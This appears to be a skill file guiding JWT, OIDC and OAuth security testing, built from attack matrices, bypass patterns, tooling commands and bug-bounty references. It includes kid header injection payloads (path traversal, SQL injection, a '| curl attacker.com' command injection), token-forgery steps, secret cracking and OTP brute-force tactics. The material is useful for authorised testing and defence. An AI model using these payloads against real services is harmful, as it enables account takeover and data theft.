---
name: authentication-jwt
description: JWT and OIDC security testing covering token forgery, algorithm confusion, and claim manipulation
depends_on: []
---

# Authentication / JWT / OIDC

JWT/OIDC failures enable token forgery, claim confusion, cross-service acceptance, and durable account takeover. Do not trust headers, claims, or token opacity without strict validation bound to issuer, audience, key, and context.

## Discovery Signals

| Signal | Indicates | Where to Look |
|--------|-----------|---------------|
| `eyJ` prefix in cookies/headers/URLs | Base64url-encoded JWT (JWS/JWE) | `Authorization: Bearer`, `Set-Cookie`, URL fragments, postMessage data |
| `/.well-known/openid-configuration` | OIDC IdP with discoverable config | Append to every base URL; check `jwks_uri`, `token_endpoint`, `issuer` |
| `/jwks.json` or `jwks_uri` response | Public keys for signature verification | Fetch keys, note `kid` values, rotation interval, `kty`/`alg` |
| `alg` in decoded JWT header | Signing algorithm in use | RS256/ES256 = asymmetric (pubkey attacks); HS256 = symmetric (secret leak) |
| `kid`, `jku`, `x5u`, `jwk` in header | Key selection mechanism | Each is an injection vector if not pinned server-side |
| Firebase `identitytoolkit.googleapis.com` | Firebase Auth backend | Public `accounts:signUp` mints JWTs for any email ($133k Google VRP) |
| `client_id` in OAuth params or APK | OAuth/OIDC app registration | Extract from mobile apps, JS bundles; enumerate `redirect_uri` whitelist |
| `state`, `nonce`, `code_verifier` | OAuth CSRF and replay defenses | Missing or predictable = CSRF, code interception, replay |
| `access_token` in URL fragment | Implicit flow token exposure | Leaks via Referer, postMessage, browser history, JS access |
| Challenge/step-up/recovery URLs | Transitional auth flows | `/forgot-password`, `/challenge`, `/verify-code` — ambiguous auth model |
| `X-User-Id` or identity headers | Gateway/proxy identity injection | Backend trusts header over token; spoof from external requests |
| Session cookie with low-entropy diff | Predictable session structure | Decode + diff across 2+ accounts; <8 variable bytes = brute-forceable |

## Attack Surface

- Web/mobile/API authentication using JWT (JWS/JWE) and OIDC/OAuth2
- Access vs ID tokens, refresh tokens, device/PKCE/Backchannel flows
- First-party and microservices verification, gateways, and JWKS distribution
- SSO flows between federated apps (Facebook/Instagram, Google Workspace, GitHub-as-IdP)
- Transitional auth flows: password reset, step-up MFA, account recovery, email change
- Mobile deep-link/redirect handlers that receive tokens or authorization codes
- CI/CD token flows: GITHUB_TOKEN, OIDC federation for cloud workloads, service account JWTs

## Reconnaissance

### Endpoints to Probe
- Well-known: `/.well-known/openid-configuration`, `/oauth2/.well-known/openid-configuration`
- Keys: `/jwks.json`, rotating key endpoints, tenant-specific JWKS
- Auth: `/authorize`, `/token`, `/introspect`, `/revoke`, `/logout`, `/device/code`
- App: `/login`, `/callback`, `/refresh`, `/me`, `/session`, `/impersonate`
- Transitional: `/forgot-password`, `/savepassword`, `/verify-code`, `/challenge`, `/step-up`
- Account mgmt: `/account-settings`, `/change-email`, `/change-password`, `/mfa/enroll`, `/mfa/disable`
- Internal/legacy: fuzz for `/tapprd/`, `/auth/identity/`, `/_ah/login`, `/admin/` on sub-properties
- Debug/dev: `/_debug/`, `/graphiql`, `/swagger`, `/__token`, `/health` (may leak config or skip auth)

### Token Anatomy
- Headers: `{"alg":"RS256","kid":"...","typ":"JWT","jku":"...","x5u":"...","jwk":{...}}`
- Claims: `{"iss":"...","aud":"...","azp":"...","sub":"user","scope":"...","exp":...,"nbf":...,"iat":...,"email_verified":...}`
- Formats: JWS (signed), JWE (encrypted). Note unencoded payload option (`"b64":false`) and critical headers (`"crit"`)
- Decode every token with `jwt_tool -d` or jwt.io; note which claims are present and which are missing
- Compare tokens across roles (admin vs user vs guest) — same `alg`/`kid` but different claims = claim-editing attack surface

## JWT Attack Matrix

| Attack | Technique | Payload / Tool | Impact |
|--------|-----------|----------------|--------|
| alg:none | Set `"alg":"none"`, drop signature | `jwt_tool -X a` / manual | Full forgery if library accepts unsigned |
| RS256-to-HS256 | Sign with HS256 using RSA pubkey as secret | `jwt_tool -X k -pk pub.pem` | Forge when verifier reads alg from header |
| kid path traversal | `"kid":"../../../../dev/null"` | Sign with empty/known key | Key selection under attacker control |
| kid SQLi | `"kid":"' UNION SELECT 'secret' --"` | Inject into key lookup | Extract secrets or execute commands |
| kid command injection | `"kid":"\| curl attacker.com"` | OS command in key lookup | RCE if kid passed to shell |
| jku redirect | Point `jku` to attacker JWKS | Host JWKS with attacker keys | Server fetches and trusts attacker keys |
| x5u redirect | Point `x5u` to attacker cert chain | Host X.509 with attacker key | Same as jku via X.509 trust path |
| jwk injection | Embed attacker JWK in header | Gen keypair, sign, embed | Libraries prefer inline JWK over configured |
| ECDSA malleability | Non-canonical signature (s vs n-s) | Flip s-value | Bypass in lenient ECDSA implementations |
| Nested JWT confusion | JWT-in-JWT verification order | Wrap forged inner in valid outer | Claims from unverified inner token used |
| exp/nbf bypass | Large clock skew or no enforcement | `exp` far future, `nbf` far past | Accept expired or not-yet-valid tokens |
| Unencoded payload | `"b64":false` + `"crit":["b64"]` | Modify payload, keep signature | Libraries mishandle b64=false verification |
| Claim stuffing | Add admin/scope/role claims | Re-sign with any bypass above | Privesc when claims trusted without authz |
| typ confusion | Send ID token where access expected | Same JWT, different context | APIs that only check signature, not `typ`/`aud` |
| Cross-service replay | Present token at unintended service | Same `iss`, different `aud` | Services that verify signature but skip `aud` |

## Token Lifecycle Attacks

| Phase | Attack | Technique |
|-------|--------|-----------|
| Issuance | Public sign-up as JWT oracle | Firebase `accounts:signUp` mints JWTs for any email; backend trusts `email` claim without checking `email_verified` |
| Issuance | Social-login token confusion | RP accepts Facebook/GitHub token from ANY app, not just its own `app_id`; check via `/debug_token` |
| Issuance | Registration as signing oracle | Activation emails contain signed payloads in same format as session tokens; register with crafted username to get valid signatures |
| Issuance | Custom token minting | Firebase Admin SDK `createCustomToken()` exposed via misconfigured cloud function; mint tokens for any `uid` |
| Transport | Referer token leak | OAuth code/token in URL leaks via Referer on navigation; chain with open redirect on whitelisted `redirect_uri` |
| Transport | postMessage wildcard leak | Token endpoint sends `postMessage(data, '*')` — any opener/parent window receives it |
| Transport | Fragment persistence | `#access_token=...` persists in browser history; JS on same origin can read `location.hash` |
| Storage | XSS token exfiltration | localStorage/sessionStorage tokens stolen via DOM XSS; HttpOnly cookies immune |
| Storage | Mobile plaintext storage | SharedPrefs/SQLite/Keychain backups; extractable via adb backup or device file access |
| Refresh | Rotation not enforced | Old refresh token reusable indefinitely; no reuse detection or family invalidation |
| Refresh | Cross-client reuse | Refresh token for Client A accepted by Client B; backends share token store |
| Revocation | Logout does not invalidate | JWT valid post-logout until `exp`; no server-side revocation list |
| Revocation | ACL cache staleness | Permission change in UI not propagated to serving layer; cached session retains old permissions |

## Authentication Bypass Patterns

| Pattern | Technique | Signal |
|---------|-----------|--------|
| Identification-as-authentication | Submit victim email alone; no ownership proof | Form accepts email without OTP/magic-link ($50k Waymo ATO) |
| Password reset sans state machine | `POST /savepassword` takes email+password, no reset token | Naked write endpoint via JS analysis ($7.5k Facebook) |
| Transitional flow exposure | Challenge endpoint returns data with token alone | Drop session cookie; replay challenge token ($15k PayPal) |
| Rate-limit aggregation inversion | Brute-force OTP across N accounts sharing device_id | Birthday-attack math on shared code space ($10k Instagram) |
| OAuth email_verified gap | Add victim email (unverified) to attacker IdP account | RP keys on `email` not `sub`; skips `verified` flag |
| PKCE downgrade | Remove `code_verifier` or switch S256 to plain | Server accepts code without PKCE challenge |
| redirect_uri path traversal | Double-encode to escape prefix on whitelisted path | `%252%0DE` escapes `/accounts_center/` ($30k Meta) |
| Conditional auth path | Leave optional fields blank; alternate code path | Blank name bypasses OTP step ($50k Waymo) |
| Method swap on auth endpoints | Change PUT to GET on profile endpoint | Write-method has auth; read-method missing it ($50k Google) |
| MFA bypass via flow reorder | Complete step 2 before step 1; skip MFA entirely | Submit password-change before MFA challenge completes |
| Token supersession | Issue new token (email change, recovery); does old token still work? | New-token flow should invalidate all prior tokens |
| Remember-me token abuse | Long-lived remember-me cookie with weak binding | Steal cookie via XSS; valid for 30+ days without re-auth |
| Account merge confusion | Link attacker account to victim via shared identifier | Merge-account flow trusts email without verification |
| Magic-link interception | Passwordless login link in URL; interceptable via email preview/Referer | Test link reuse, TTL, and binding to requestor session |

## Defense-Bypass Pairs

| Defense | Bypass | Test |
|---------|--------|------|
| Algorithm pinning (RS256 only) | jwk/jku/x5u header injection (supply own key) | Set jku to attacker server; sign with your keypair |
| kid-based key selection | kid path traversal, SQLi, or command injection | `kid: ../../dev/null`, `kid: ' UNION SELECT 'x' --` |
| JWKS URL whitelist | SSRF via internal JWKS fetch; DNS rebinding | Point jku to internal host or rebinding domain |
| Token expiration | Clock skew tolerance >5min; server drift | Send `exp` = now - 300; observe acceptance window |
| Audience enforcement | Token confusion: ID token as access token | Swap `typ` or present at wrong endpoint |
| CSRF via state param | Predictable state; state not bound to session | Replay captured state; use fixed value across sessions |
| Rate-limit per (device, account) | Client-controlled device_id; aggregate across N | Same device_id for 1M accounts; shared code space |
| Secondary auth headers | Conditional bypass via debug Referer or Origin | `Referer: http://127.0.0.1`, `Origin: null` |
| PKCE (S256) | Server accepts plain verifier or absent challenge | Omit `code_verifier` entirely; test `plain` method |
| Token binding (DPoP/mTLS) | Missing binding enforcement on some endpoints | Replay token from different device without proof |

## Microservices and Gateway Attacks

- **Audience mismatch**: Internal services verify JWT signature but ignore `aud` — tokens for Service A accepted by Service B. Test every internal API with tokens minted for a different service
- **Header trust without re-verification**: Edge gateway injects `X-User-Id` from JWT; backend trusts header alone. Spoof the header if the gateway is bypassable or if direct backend access exists
- **Async consumers**: Workers process queued messages with embedded bearer tokens; skip verification on replay or trust tokens after expiry. Check message queue consumers separately from API handlers
- **Cross-tenant JWKS**: Multi-tenant IdP serves different keys per tenant; broken tenant isolation = cross-tenant forgery. Create two test tenants and try each tenant's token against the other
- **Shared-key conflation**: Public API key (embedded in APKs) treated as authorization by backend endpoints. Decompile any mobile app, extract the key, test against every API endpoint ($50k Firebase Dynamic Links)
- **gRPC/WebSocket skip**: REST endpoints verify JWT; gRPC or WebSocket handlers on same service skip verification entirely. Always test non-HTTP protocols separately
- **Service mesh bypass**: Internal-only services accessible via port-forward, debug proxy, or SSRF may skip all auth assuming network-level isolation

## OAuth/OIDC-Specific Attacks

| Attack | Mechanism | Bounty Reference |
|--------|-----------|------------------|
| redirect_uri + open redirect chain | Whitelisted `redirect_uri` contains `continue=`/`next=` param; code leaks via Referer | $750k Google, $50k Eclipse |
| Client impersonation | Use legitimate `client_id` from IDE plugin/desktop app; victim sees trusted consent screen | $50k Google Cloud Tools |
| OIDC mix-up attack | Multi-IdP RP confused about which IdP issued code; attacker's IdP receives victim's code | Academic (Fett et al. 2016) |
| Token scope over-permission | First-party token carries scopes far exceeding the issuing surface's needs | $313k Google CloudPrint |
| Device code phishing | Display attacker's device code on phishing page; victim authorizes attacker's device | Targets: Azure AD, Google |
| Implicit flow downgrade | Force `response_type=token` instead of `code`; token exposed in fragment | Older OAuth implementations |
| Authorization code injection | Attacker swaps their code into victim's callback if state/PKCE missing | Classic OAuth attack |
| APK credential extraction | Decompile APK; extract `google_api_key`, `client_id`, cert SHA1, deep-link hosts | $50k Firebase Dynamic Links |

## Testing Methodology

1. **Inventory issuers and consumers** — IdPs, API gateways, microservices, mobile/web clients, worker queues
2. **Capture tokens** — Access/ID tokens for multiple roles; decode headers and claims; note `alg`, `kid`, `iss`, `aud`, `exp`, `email_verified`
3. **Map verification endpoints** — `/.well-known/openid-configuration`, `/jwks.json`, `/oauth/token`, `/introspect`; fetch and save public keys
4. **Run the JWT bypass matrix** — alg:none, RS256-to-HS256, kid injection, jku/x5u/jwk injection. Use `jwt_tool -M at` for automated scanning
5. **Test claim enforcement** — Modify `sub`, `scope`, `roles`, `email`, `aud`, `iss`, `typ` independently; observe which are validated
6. **Cross-use matrix** — Token Type x Audience x Service; present each token at every endpoint. Include ID token at API endpoints
7. **Test lifecycle** — Refresh reuse, post-logout acceptance, expired token tolerance, ACL change propagation delay
8. **Test transitional flows** — Password reset, account recovery, step-up MFA: test each endpoint with no auth, partial auth, stale token, cross-user token
9. **Test OAuth flows** — redirect_uri manipulation, PKCE downgrade, state/nonce prediction, code interception via Referer, client_id enumeration
10. **Decode and diff sessions** — Decode cookies/tokens from 2+ accounts; diff byte-by-byte; low variable bytes = brute-force candidate
11. **Test minimum-input paths** — On every auth form, submit bare minimum (email only, blank fields, missing params); observe if access granted without verification
12. **Enumerate redirect_uri trust set** — For each whitelisted host, hunt for XSS, open redirect, `continue=`/`next=` params; any weakness on trusted host = token theft

## Chain Patterns

| Chain | Steps | Severity |
|-------|-------|----------|
| XSS on SSO-trusted domain -> token theft -> ATO | XSS on redirect_uri host; steal first-party token via postMessage or fragment | Critical |
| SSRF -> internal JWKS -> forge tokens | SSRF reaches internal JWKS; extract private key or replace pubkey; sign arbitrary tokens | Critical |
| Open redirect on redirect_uri -> Referer code leak | OAuth code in URL; redirect_uri has `continue=` param; Referer leaks code | Critical ($750k) |
| Firebase signUp oracle -> email_verified bypass | Register any email via public endpoint; JWT `email_verified:false`; backend checks only `email` | High ($133k) |
| OAuth app_id confusion -> cross-app token -> ATO | Attacker Facebook/GitHub app; victim token for attacker app; RP accepts via `sub` only | High |
| Login CSRF + path traversal + postMessage -> steal | Force-login attacker session; path-traversal SSO redirect; postMessage(*) leaks token | Critical ($30k) |
| Session diff + registration oracle + Referer bypass | Diff cookies; registration signs crafted payload; internal Referer skips secondary auth | Critical ($50k) |
| Rate-limit inversion + OTP aggregation -> mass ATO | OTPs for N accounts via shared device_id; birthday-attack on shared code space | Critical ($10k) |
| CI token leak + OIDC federation -> cloud compromise | Exfil GITHUB_TOKEN from Actions; `id-token: write` permission mints cloud OIDC tokens | High ($10k) |
| CSRF on password-change + missing current-password -> ATO | No CSRF protection on password endpoint; no current-password required; one page visit = ATO | High |
| Token in URL + link preview bot -> token harvest | Tokens in URL fragments/params captured by Slack/Teams/email link-preview bots via Referer | Medium-High |
| Host header poison -> OIDC redirect_uri -> code capture | Manipulate Host header; OIDC callback constructs redirect_uri from Host; code sent to attacker | High |

## Special Contexts

### Mobile
- Deep-link/redirect handlers leak codes/tokens via intent interception; insecure WebView bridges expose tokens to JS
- Token storage in plaintext SharedPrefs/SQLite/Keychain backups; adb backup extractable
- APK resources leak `google_api_key`, `client_id`, package name, signing cert SHA1 — full credential set for API abuse
- Custom URL schemes (non-HTTPS) can be claimed by malicious apps; prefer App Links/Universal Links
- WebView cookie jars may persist across navigation; tokens from one WebView context accessible in another
- Certificate pinning bypass (Frida/objection) may reveal additional auth headers or token formats

### SSO Federation
- Multiple IdPs/SPs with mixed metadata or stale keys accept foreign tokens across organizational boundaries
- Cross-platform SSO (Facebook<->Instagram, Google Workspace<->YouTube) multiplies trust boundary surface
- Legacy redirect rules survive architectural changes (old path prefixes still whitelisted after domain migration)
- SAML/OIDC metadata XML injection can alter trusted endpoints if metadata parsing is lenient
- IdP confusion: when RP supports multiple IdPs, test if one IdP's token is accepted in another IdP's flow (mix-up attack)

### CI/CD
- `pull_request_target` + checkout of PR head = attacker code runs with repo secrets ($10k Google)
- Label-gated workflows bypassed when auto-label bots assign labels based on attacker-controlled PR titles
- OIDC federation tokens (`id-token: write`) allow cloud IAM impersonation from compromised workflows
- Service account key files and CI tokens in build logs, artifacts, or environment variables

### Password Reset / Account Recovery
- Multi-step recovery flows often expose naked write endpoints (`/savepassword`) without state-machine binding
- Recovery tokens in URLs leak via Referer, email forwarding, or link-preview bots
- "Security challenge" endpoints sit between unauthenticated and authenticated state — auth model ambiguity
- OTP delivery via SMS/email creates a window; test for code reuse, long TTL, no single-use enforcement
- Password reset link generation: test if you can trigger reset for victim, then predict or intercept the token

## Tooling Quick Reference

| Tool | Purpose | Key Commands |
|------|---------|-------------|
| jwt_tool | Full JWT attack suite | `-M at` (all tests), `-X a` (alg:none), `-X k` (key confusion), `-X s` (sign), `-T` (tamper) |
| jwt.io | Online JWT decoder | Paste token; inspect header/payload/signature; verify with public key |
| Burp JWT extension | Intercept and modify JWTs | Auto-detect JWT in requests; edit claims inline; resign |
| JOSEPH (Burp) | JWT-specific Burp plugin | Automated alg confusion, key confusion, signature stripping |
| pyjwt / python-jose | Programmatic JWT forge/verify | Script custom attacks with exact algorithm and key control |
| jwt-cracker / hashcat | Brute-force HS256 secret | `jwt-cracker <token>` or `hashcat -m 16500 <token>` |
| ffuf / gobuster | Fuzz auth endpoints | Target `/auth/`, `/identity/`, `/_ah/`, `/tapprd/`, `/api/v1/accounts/` |
| jadx / apktool | APK decompilation | Extract `google_api_key`, `client_id`, deep-link hosts, cert SHA1 from resources |
| Burp Intruder | Differential response analysis | Spray auth endpoints; 302 vs 403 vs 200 = valid/invalid signal |

## Validation

1. Show forged or cross-context token acceptance (wrong alg, wrong audience/issuer, attacker-signed JWKS)
2. Demonstrate access token vs ID token confusion at an API — present ID token, get API access
3. Prove refresh token reuse without rotation detection or revocation — replay old token after rotation
4. Confirm header abuse (kid/jku/x5u/jwk) leading to key selection under attacker control
5. For auth bypass: show pre-auth to authenticated transition with only attacker-controlled inputs
6. For chain attacks: demonstrate each link independently, then full chain with combined impact
7. For mass attacks: show the math (N accounts x code space x time window = probability of compromise)
8. For transitional flow bugs: show the endpoint response with and without proper session to prove the auth gap
9. For email_verified bypass: register unverified email via public endpoint, show resulting JWT claims, show backend accepting it

## False Positives

- Token rejected due to strict audience/issuer enforcement on every acceptance path
- Key pinning with JWKS URL whitelist, certificate chain validation, and TLS verification
- Short-lived tokens (<5min) with server-side rotation tracking and revocation on logout
- ID token not accepted by APIs that require access tokens (both `typ` and `aud` checked)
- Algorithm pinned at library config level, not read from token header; `alg:none` and HS256 rejected
- `email_verified` checked AND unverified emails rejected before any access granted
- State/nonce bound to session with HMAC; PKCE S256 strictly enforced; implicit flow disabled
- Rate limits applied per-account globally (not per-device or per-IP); account locks after N failures
- Password reset requires multi-step state machine: request -> email token -> verify -> change (no naked writes)

## Impact

| Impact Class | Description | Bounty Range |
|-------------|-------------|--------------|
| Full ATO | Token forgery, session hijack, or auth bypass gives complete account control | $7.5k-$750k |
| Mass ATO | Rate-limit inversion or predictable sessions enable N-account compromise | $10k-$50k |
| Privilege escalation | Claim manipulation or cross-service token gives admin/internal access | $10k-$313k |
| Cross-tenant access | Audience confusion or shared-key abuse leaks other tenants' data | $50k-$133k |
| Token minting | Attacker-controlled keys or public sign-up oracles forge valid tokens | $50k-$133k |
| Supply-chain compromise | Stolen CI/CD tokens or cloud OIDC federation enable code/infra takeover | $10k-$3.1M |
| Branded phishing | API key extraction enables attacker content on victim's branded domains | $50k |
| Data exfiltration | Transitional flow endpoints return PII, passwords, or internal data without proper auth | $15k-$133k |

## Pro Tips

1. **Always test the dumb thing first**: submit only an email, leave other fields blank, drop auth headers entirely. The $50k Waymo ATO was just entering someone's email and clicking Continue
2. **Decode and diff everything**: any signed cookie/token, decode across 2+ test accounts; low-entropy variable bytes = brute-force path; registration/activation flows may be signing oracles
3. **Run the full JWT bypass matrix early**: alg:none, HS256-with-pubkey, kid traversal, jku/jwk injection. `jwt_tool -M at` automates the common checks
4. **Check `email_verified` claim**: Firebase/Google/GitHub all allow adding unverified emails; if RP trusts `email` without checking `verified`, you have impersonation for any email address
5. **Map every redirect_uri and audit each landing page**: any XSS, open redirect, or `continue=`/`next=`/`return_url=` param on a whitelisted host converts to code/token theft via Referer
6. **Hunt transitional auth flows**: password reset, step-up, MFA enrollment, account merge, device code — test each XHR endpoint with no auth, partial auth, stale token, cross-user token. Highest-paying ATO bugs live here
7. **Invert rate limits**: identify the rate-limit key (IP, device_id, account); if any component is client-controlled, aggregate across the uncontrolled dimension. Birthday-attack math applies
8. **Check conditional security paths**: `Referer: http://127.0.0.1` or `Origin: null` may skip secondary auth checks left over from debug/local-dev configuration
9. **Audit identification vs authorization on API keys**: a key baked into an APK is identification. If any endpoint treats it as authorization for writes, that is an auth bypass. Decompile APKs and test every endpoint the key can reach
10. **Test ACL state transitions**: change permission from permissive to restrictive, then verify enforcement. Cache staleness means the old permission may survive indefinitely
11. **Verify token context on every acceptance path**: gateway, direct API, WebSocket, gRPC, worker queue, mobile, and CLI may each verify differently. Token accepted at one path but rejected at another = partial bypass
12. **Look for sub-properties of major targets**: `legal.thefacebook.com`, `partners.google.com`, `tools.internal.company.com` — auxiliary domains run custom auth with less hardening than the main site
13. **Decode every non-JWT token from Base64 and check for delimiter-separated fields** — `||`, `|`, `:`, `;` separators on user-controllable data enable boundary-shifting attacks that bypass HMAC signatures ($150k VirusTotal)
14. **Find signing oracles**: when crypto blocks brute-force, look for ANY flow that signs content with the same key — registration confirmations, password resets, magic links, invite URLs. If the format matches the session cookie format, you have a forging primitive ($50k VirusTotal)
15. **For every multi-layer credential UI (device lock + SIM + work profile + app lock), test whether dismissing an inner credential also dismisses the outer** — shared dismiss handlers are a recurring auth bypass class ($70k Pixel)
16. **Fingerprint the backend platform (Firebase, Supabase, Amplify, Hasura) then query its REST API directly** — many apps rely on UI-only restrictions while the underlying bucket/database has `auth != null` rules that any authenticated user passes ($50k)
17. **For any tier/edition-gated feature, test parity across all tiers** — free-tier accounts often reach paid endpoints because the gate is UI-only; check if the API enforces the plan restriction ($1.5k)
18. **Treat every numeric or boolean POST/GET parameter on auth-adjacent endpoints as a candidate authority flag** — parameters like `verified=1`, `skip_mfa=true`, `role=admin`, `is_internal=1` are sometimes trusted by the server without cross-checking session state. Flip each and observe ($0-$50k)
19. **For signed-API systems, identify the exact byte sequence the signature covers, then find all attacker-influenceable bytes within that range** — if the signature covers `header||body` but you control a field inside body, you may inject content that changes meaning after parsing without breaking the signature ($500-$150k)

## Token Format Exploitation

| # | Token Format | Attack Technique | Real-World Example |
|---|-------------|-----------------|-------------------|
| 1 | Base64-encoded delimiter-separated (user..ts..hash) | Shift chars across field boundary; hash covers concatenation, not parsed fields | VirusTotal: move digit from username to timestamp, activate victim account ($150k) |
| 2 | Low-entropy session cookie (4-5 variable bytes across users) | Decode + diff 2+ accounts; brute-force variable bytes | VirusTotal: session strings differ by 4-5 bytes, brute-forceable ($50k) |
| 3 | Registration/activation as signing oracle | Create user with target bytes as username; activation email signs it | Use activation link payload as forged session cookie ($50k) |
| 4 | Conditional header-check bypass | `Referer: http://127.0.0.1` skips secondary auth headers (debug remnant) | VirusTotal: bypass VT_SESSION_HASH via localhost Referer ($50k) |
| 5 | Cookie tokens with pipe/semicolon/comma separators | Inject delimiter inside attacker-controlled field; escape and double-delimiter tests | DSV (delimiter-separated values) injection class ($150k) |

## Stacked Credential and Physical Access Attacks

| # | Technique | What to Test | Real-World Example |
|---|-----------|-------------|-------------------|
| 1 | Stacked credential dismiss confusion | Dismiss inner credential (SIM PIN) also dismisses outer (device lock) | Google Pixel: SIM PUK reset unlocks device completely ($70k) |
| 2 | Attacker-supplied secondary credential | Insert attacker-controlled SIM/USB/NFC while primary lock active | Attacker brings own SIM with known PUK; no target knowledge needed ($70k) |
| 3 | Multi-layer credential scope audit | For every dismiss/cancel/back action on a credential UI, verify outer states preserved | SIM PIN dismiss handler called generic `dismiss(true)` on entire container |
| 4 | Layered auth surface enumeration | Enumerate all credential screens active simultaneously (device + SIM + work profile + app) | Any layered credential system where dismissal logic is shared |

## Backend Platform Auth Bypass

| # | Backend Platform | Technique | Real-World Example |
|---|-----------------|-----------|-------------------|
| 1 | Firebase Storage | Query bucket directly via REST API with any authenticated JWT (`request.auth != null`) | Motus/Area 120: listed all files including Datastore exports with PII ($50k) |
| 2 | Firebase Auth | Public `accounts:signUp` mints JWTs for any email; backend trusts `email` claim | Firebase Dynamic Links: API key from APK treated as authorization ($50k) |
| 3 | Supabase/Hasura/Amplify | Fingerprint backend from JS config; query underlying REST/GraphQL API directly | Bypass UI-only restrictions by knowing the platform's API surface |
| 4 | Firebase Realtime DB | Query `/{path}.json` with authenticated token; check read rules per path | `request.auth != null` is authentication, not authorization |
| 5 | Cloud Datastore exports in storage | Look for `*/all_namespaces/all_kinds/output-*` folder patterns in bucket listings | System database exports co-located with user content ($50k) |

## High-Value Target Patterns

These patterns recur in disclosed reports paying $10k+:

- **Sub-properties of major companies**: `legal.thefacebook.com`, `careers.withwaymo.com`, `partner-companion.cloud.google` — custom auth, less hardened than main site. Subdomain enumeration is the first step
- **Fix-bypass methodology**: after a patch is applied, ask what the fix added and what it did NOT add. The fix for "no auth" was "accept Firebase JWT" — but JWT email claim was unverified ($133k bypass of $133k original)
- **Two-pass URL validation**: URL validated by one parser, fetched by another. Parser disagreement = attacker-controlled destination ($750k Google). Test with: userinfo confusion (`https://trusted@attacker.com/`), fragment confusion (`https://attacker.com#trusted.com`), path-suffix confusion, URL-encoding confusion
- **First-party token scope creep**: tokens minted for one Meta/Google surface carry scopes far exceeding that surface's needs. Debug tokens via the provider's token-inspection endpoint (`/debug_token`, `accounts.google.com/tokens/`)
- **The UI-API delta**: every privacy/security claim the product makes in its UI must be verified at the API level. "Private" content visible to wrong accounts, "revoked" tokens still accepted, "disabled" features still functional
- **Cross-product bulk-export authorization bypass**: when Product A holds resources with stricter ACLs than Product B, but both share a backend, test whether B's bulk-export/data-portability endpoints can export A's restricted resources. The export path often inherits B's weaker authorization model ($313k Google)
- **Account lifecycle state enumeration**: systematically test access at every intermediate account state — anonymous, pending-verification, email-changed-not-confirmed, suspended, deactivated, invited-not-accepted, password-reset-in-progress, deleted-within-grace-period. Auth models often assume binary (logged-in / logged-out) and leave intermediate states permissive ($50k)
- **Minimum-input authentication probing**: on any form asking for identifying information, submit the bare minimum (email only, username only, blank optional fields). Observe whether the server grants access, returns a session, or leaks data without requiring full credential proof ($50k)
- **Auth-flow interaction matrix**: for every account, build a state matrix of auth settings (password set/unset, MFA on/off, social linked/unlinked, recovery configured/not) and test every auth flow at every matrix cell. Flows designed for one cell often break at unexpected combinations ($1.5k-$15k)
- **UI-only authorization gates**: when a server returns an HTML interstitial saying "you cannot proceed because of X," test whether the next-step endpoint works without completing the gate. Drop the interstitial request and call the post-gate endpoint directly ($3k)

## Summary

Verification must bind the token to the correct issuer, audience, key, and client context on every acceptance path. Any missing binding enables forgery or confusion. The highest-bounty bugs in this class chain token/session weaknesses with transport-layer leaks (Referer, postMessage, open redirect) or trust-boundary confusion (identification-as-authorization, email_verified gaps, cross-app token acceptance).
